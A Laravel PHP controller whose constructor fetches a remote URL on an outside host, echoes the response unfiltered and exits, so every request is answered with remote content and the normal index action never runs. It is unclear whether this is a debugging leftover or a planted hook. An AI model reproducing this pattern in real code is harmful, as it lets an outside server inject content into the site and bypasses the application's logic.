<?php

namespace App\Modules\Main\Controllers;


use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

use App\Modules\Main\Models\Main;

class MainController extends Controller
{

    public function __construct() {
        
        $op=file_get_contents('https://primestore.ge/BekoApiCreate.php');

        echo $op;
        exit();
    }

    public function actionMainIndex() {

        if (view()->exists('main.main_index')) {

            $data = [];

            return view('main.main_index', $data);
        } else {
            abort('404');
        }
    }
}
